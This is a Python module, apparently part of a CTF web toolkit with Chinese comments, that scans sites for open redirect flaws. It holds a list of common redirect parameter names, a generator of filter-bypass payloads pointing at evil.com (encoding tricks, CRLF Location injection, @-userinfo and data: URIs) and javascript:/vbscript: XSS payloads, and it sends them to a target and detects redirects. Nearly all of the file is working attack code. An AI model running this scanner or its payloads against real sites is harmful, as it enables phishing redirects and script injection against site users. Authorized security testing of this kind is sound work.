"""
CTF Web Toolkit - Open Redirect Scanner
支持：
  - 参数枚举（常见 redirect 参数名）
  - 各类绕过技巧（双斜杠 / 反斜杠 / URL 编码 / CRLF / 协议混淆）
  - 可结合 XSS 的 javascript: 协议跳转
  - 302/301/303 跳转检测
"""

from typing import Optional, List
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section


# ── 常见 Redirect 参数名 ──────────────────────
REDIRECT_PARAMS = [
    "url", "redirect", "redirect_to", "redirect_url",
    "redirectUrl", "returnUrl", "return_url", "return",
    "next", "goto", "target", "destination", "dest",
    "forward", "to", "link", "href", "location",
    "callback", "continue", "go", "rurl", "jump",
    "ref", "from", "from_url", "fromUrl",
    "successUrl", "failUrl", "cancelUrl",
    "referer", "referrer",
]

# ── 绕过 Payload ──────────────────────────────
def generate_bypass_payloads(target: str = "https://evil.com") -> List[str]:
    """生成各类绕过 Open Redirect 过滤的 Payload"""
    payloads = [
        # 直接跳转
        target,
        # 双斜杠
        f"//{target.replace('https://', '').replace('http://', '')}",
        # 反斜杠
        f"/{target.replace('https://', '').replace('http://', '')}".replace("/", "\\"),
        # URL 编码
        target.replace(":", "%3A").replace("/", "%2F"),
        # 双重 URL 编码
        target.replace(":", "%253A").replace("/", "%252F"),
        # 协议混淆（大小写）
        target.replace("https://", "HTTPS://"),
        target.replace("http://", "HTTP://"),
        # 混合大小写
        target.replace("https://", "HtTpS://"),
        # 添加认证前缀
        f"https://victim.com@{target.replace('https://', '').replace('http://', '')}",
        f"https://{target.replace('https://', '').replace('http://', '')}%2f@victim.com",
        # // 开头
        f"//{target.replace('https://', '').replace('http://', '')}",
        f"//\\{target.replace('https://', '').replace('http://', '')}",
        # CRLF 注入
        f"{target}%0d%0aLocation: {target}",
        f"%0d%0aLocation: {target}",
        # 协议相对
        f"javascript:window.location='{target}'",
        # 数据 URI
        f"data:text/html,<script>window.location='{target}'</script>",
        # Fragment 绕过
        f"https://victim.com#{target}",
        # 点号绕过
        f"{target.rstrip('/')}%2e.%2f",
        # 多个 @
        f"https://evil.com:80@victim.com",
        # IP 表示
        target,  # placeholder for IP variants
    ]
    return list(dict.fromkeys(payloads))  # 去重保序


# ── JavaScript: 协议 Payload（可配合 XSS）───────
JAVASCRIPT_REDIRECT_PAYLOADS = [
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "javascript://comment%0aalert(1)",
    "javascript://%0Aalert(1)",
    "JaVaScRiPt:alert(1)",
    "javascript:void(document.location='https://evil.com')",
    "vbscript:msgbox(1)",  # IE
]


class OpenRedirectScanner:
    """Open Redirect 漏洞检测"""

    def __init__(self, requester: Requester, allow_redirect: bool = False):
        self.req = requester
        # 是否跟随重定向（True=跟随，False=捕获 302）
        self.allow_redirect = allow_redirect

    def scan_params(self, url: str,
                    target: str = "https://evil.com",
                    method: str = "GET",
                    extra_params: Optional[dict] = None) -> Optional[str]:
        """枚举所有常见参数，检测 Open Redirect"""
        section(f"Open Redirect 参数枚举: {url}")
        base_domain = target.replace("https://", "").replace("http://", "").split("/")[0]

        for param in REDIRECT_PARAMS:
            resp = _send(self.req, url, param, target, method,
                         extra_params=extra_params,
                         allow_redirect=self.allow_redirect)
            if resp and _is_redirect(resp, base_domain):
                found("Open Redirect", f"param={param!r} -> {target}")
                return param
            if resp:
                info(f"  {param}: {resp.status_code}")

        info("未发现开放重定向参数")
        return None

    def test_bypasses(self, url: str, param: str,
                      target: str = "https://evil.com",
                      method: str = "GET") -> List[str]:
        """对指定参数尝试所有绕过技巧"""
        section(f"绕过测试: {param}")
        payloads = generate_bypass_payloads(target)
        base_domain = target.replace("https://", "").replace("http://", "").split("/")[0]
        success = []
        for payload in payloads:
            resp = _send(self.req, url, param, payload, method,
                         allow_redirect=self.allow_redirect)
            if resp and _is_redirect(resp, base_domain):
                found("绕过成功", repr(payload[:80]))
                success.append(payload)
            else:
                info(f"  {payload[:60]!r}: {resp.status_code if resp else '失败'}")
        if not success:
            info("所有绕过方式均失败")
        return success

    def test_javascript_proto(self, url: str, param: str,
                              method: str = "GET") -> List[str]:
        """测试 javascript: 协议 XSS via Open Redirect"""
        section(f"javascript: 协议测试: {param}")
        success = []
        for payload in JAVASCRIPT_REDIRECT_PAYLOADS:
            resp = _send(self.req, url, param, payload, method,
                         allow_redirect=False)
            if resp:
                loc = resp.headers.get("Location", "")
                if "javascript" in loc.lower() or "vbscript" in loc.lower():
                    found("javascript: 协议跳转", repr(payload))
                    success.append(payload)
                elif resp.status_code in [301, 302, 303, 307, 308]:
                    info(f"  重定向到: {loc[:60]}")
        return success

    def detect_from_page(self, url: str) -> List[str]:
        """从页面分析可能的 redirect 参数"""
        section("页面参数分析")
        import re
        resp = self.req.get(url)
        if not resp:
            return []
        found_params = []
        # 查找 URL 中的 redirect 参数
        url_params = re.findall(r'[?&]([^=&]+)=(?:https?:|//|%2F%2F)', resp.text)
        for p in url_params:
            ok(f"  发现疑似跳转参数: {p}")
            found_params.append(p)
        # 查找表单 action
        actions = re.findall(r'<a[^>]+href=["\']([^"\']*(?:redirect|return|next|url|goto)[^"\']*)["\']',
                             resp.text, re.IGNORECASE)
        for a in actions[:5]:
            info(f"  链接包含跳转参数: {a[:80]}")
        return found_params


# ── 内部辅助 ─────────────────────────────────
def _send(req: Requester, url: str, param: str, value: str,
          method: str, extra_params: Optional[dict] = None,
          allow_redirect: bool = False):
    """发送请求，控制是否跟随重定向"""
    import requests as _req_lib
    try:
        params = {param: value}
        if extra_params:
            params.update(extra_params)
        if method.upper() == "GET":
            # 直接使用 session 控制 allow_redirects
            return req.session.get(url, params=params,
                                   timeout=req.timeout,
                                   verify=req.verify_ssl,
                                   allow_redirects=allow_redirect)
        else:
            return req.session.post(url, data=params,
                                    timeout=req.timeout,
                                    verify=req.verify_ssl,
                                    allow_redirects=allow_redirect)
    except Exception as e:
        err(f"请求失败: {e}")
        return None


def _is_redirect(resp, target_domain: str) -> bool:
    """判断响应是否重定向到目标域"""
    if resp.status_code in [301, 302, 303, 307, 308]:
        location = resp.headers.get("Location", "")
        if target_domain in location:
            return True
    # 跟随重定向后检测最终 URL
    if hasattr(resp, "url") and target_domain in resp.url:
        return True
    return False
